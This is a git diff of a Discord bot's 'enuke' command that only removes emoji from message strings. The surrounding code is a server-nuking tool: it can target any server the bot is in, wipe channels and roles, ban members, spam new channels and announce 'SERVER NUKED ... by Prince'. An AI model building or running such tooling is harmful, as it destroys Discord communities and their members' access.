@@ -26,14 +26,14 @@ export const commands = [
       if (args[0] && /^\d{17,20}$/.test(args[0])) {
         const resolved = message.client.guilds.cache.get(args[0]);
         if (!resolved) {
-          return message.reply({ embeds: [embed.danger('Guild Not Found', `${message.author} ❌ Could not find a guild with ID \`${args[0]}\`. The bot must be a member of that server.`)] });
+          return message.reply({ embeds: [embed.danger('Guild Not Found', `${message.author}  Could not find a guild with ID \`${args[0]}\`. The bot must be a member of that server.`)] });
         }
         targetGuild = resolved;
         targetGuildId = resolved.id;
       }
 
       if (!targetGuild) {
-        return message.reply({ embeds: [embed.danger('No Target', `${message.author} ❌ No guild found. Use \`enuke\` inside a server or \`enuke <serverId>\`.`)] });
+        return message.reply({ embeds: [embed.danger('No Target', `${message.author}  No guild found. Use \`enuke\` inside a server or \`enuke <serverId>\`.`)] });
       }
 
       // Store target for button interaction
@@ -48,14 +48,14 @@ export const commands = [
 
       // Build the Enuke Manager entry embed
       const enukeEmbed = embed.build({
-        title: '🧨 Enuke Manager',
+        title: ' Enuke Manager',
         description: 
           `**Target Server:** \`${targetGuild.name}\`\n` +
           `**Server ID:** \`${targetGuildId}\`\n` +
           `**Members:** \`${targetGuild.memberCount}\`\n` +
           `**Channels:** \`${targetGuild.channels.cache.size}\`\n` +
           `**Roles:** \`${targetGuild.roles.cache.size}\`\n\n` +
-          `⚠️ **This action is IRREVERSIBLE.** Press the button below to configure the nuke sequence.`,
+          `️ **This action is IRREVERSIBLE.** Press the button below to configure the nuke sequence.`,
         color: '#ff0000',
         fields: [
           { name: 'Mode 1', value: '`Channels & Roles` — Wipe all channels and roles only', inline: false },
@@ -67,7 +67,7 @@ export const commands = [
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
           .setCustomId(`enuke_open_manager_${message.author.id}`)
-          .setLabel('🔴 Open Enuke Manager')
+          .setLabel(' Open Enuke Manager')
           .setStyle(ButtonStyle.Danger)
       );
 
@@ -90,20 +90,20 @@ export async function handleEnukeButton(interaction) {
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '🛡️ Access Denied. Only the Bot Owner can use this.', ephemeral: true });
+    return interaction.reply({ content: '️ Access Denied. Only the Bot Owner can use this.', ephemeral: true });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
   const target = enukeTargets.get(sessionKey);
   
   if (!target) {
-    return interaction.reply({ content: '❌ Session expired. Please run the `enuke` command again.', ephemeral: true });
+    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.', ephemeral: true });
   }
 
   // Build the modal
   const modal = new ModalBuilder()
     .setCustomId(`enuke_modal_${interaction.user.id}`)
-    .setTitle('🧨 Enuke Manager');
+    .setTitle(' Enuke Manager');
 
   const modeInput = new TextInputBuilder()
     .setCustomId('enuke_mode')
@@ -156,14 +156,14 @@ export async function handleEnukeModal(interaction) {
   
   // Only the bot owner can use this
   if (!isBotOwnerSync(interaction.user.id)) {
-    return interaction.reply({ content: '🛡️ Access Denied.', ephemeral: true });
+    return interaction.reply({ content: '️ Access Denied.', ephemeral: true });
   }
 
   const sessionKey = `enuke_${interaction.user.id}`;
   const target = enukeTargets.get(sessionKey);
 
   if (!target) {
-    return interaction.reply({ content: '❌ Session expired. Please run the `enuke` command again.', ephemeral: true });
+    return interaction.reply({ content: ' Session expired. Please run the `enuke` command again.', ephemeral: true });
   }
 
   // Parse modal fields
@@ -191,12 +191,12 @@ export async function handleEnukeModal(interaction) {
   enukeTargets.delete(sessionKey);
 
   // Acknowledge the modal
-  await interaction.reply({ embeds: [embed.danger('🧨 Nuke Sequence Initiated', `Target: **${target.guildName}** (\`${target.guildId}\`)\nMode: **${mode}** | Channels to create: **${channelCount}** | Name: **${channelName}**\n\n⏳ Executing...`)], ephemeral: true });
+  await interaction.reply({ embeds: [embed.danger(' Nuke Sequence Initiated', `Target: **${target.guildName}** (\`${target.guildId}\`)\nMode: **${mode}** | Channels to create: **${channelCount}** | Name: **${channelName}**\n\n Executing...`)], ephemeral: true });
 
   // Resolve the guild
   const guild = interaction.client.guilds.cache.get(target.guildId);
   if (!guild) {
-    return interaction.followUp({ content: '❌ Guild no longer accessible.', ephemeral: true });
+    return interaction.followUp({ content: ' Guild no longer accessible.', ephemeral: true });
   }
 
   // Execute the nuke
@@ -204,16 +204,16 @@ export async function handleEnukeModal(interaction) {
 
   // Report results
   const resultEmbed = embed.build({
-    title: '🧨 Enuke Sequence Complete',
+    title: ' Enuke Sequence Complete',
     description: `Target: **${target.guildName}** (\`${target.guildId}\`)`,
     color: '#ff0000',
     fields: [
-      { name: '📋 Mode', value: `\`${mode}\``, inline: true },
-      { name: '🔴 Channels Deleted', value: `\`${results.channelsDeleted}\``, inline: true },
-      { name: '🔴 Roles Deleted', value: `\`${results.rolesDeleted}\``, inline: true },
-      { name: '🔴 Members Banned', value: `\`${results.membersBanned}\``, inline: true },
+      { name: ' Mode', value: `\`${mode}\``, inline: true },
+      { name: ' Channels Deleted', value: `\`${results.channelsDeleted}\``, inline: true },
+      { name: ' Roles Deleted', value: `\`${results.rolesDeleted}\``, inline: true },
+      { name: ' Members Banned', value: `\`${results.membersBanned}\``, inline: true },
       { name: '🟢 Channels Created', value: `\`${results.channelsCreated}\``, inline: true },
-      { name: '❌ Errors', value: `\`${results.errors}\``, inline: true }
+      { name: ' Errors', value: `\`${results.errors}\``, inline: true }
     ]
   });
 
@@ -305,7 +305,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
     const timestampStr = now.toLocaleDateString('en-GB', { timeZone: 'Asia/Kolkata', weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' }) + ' ' + now.toLocaleTimeString('en-GB', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) + ' (IST)';
 
     const nukeAnnouncement = embed.build({
-      title: '💥 SERVER NUKED',
+      title: ' SERVER NUKED',
       description: `This server has been nuked by Prince`,
       color: '#ff0000',
       fields: [
@@ -337,7 +337,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
     const timestampStr = now.toLocaleDateString('en-GB', { timeZone: 'Asia/Kolkata', weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' }) + ' ' + now.toLocaleTimeString('en-GB', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' }) + ' (IST)';
 
     const nukeAnnouncement = embed.build({
-      title: '💥 SERVER NUKED',
+      title: ' SERVER NUKED',
       description: `This server has been nuked by Prince`,
       color: '#ff0000',
       fields: [
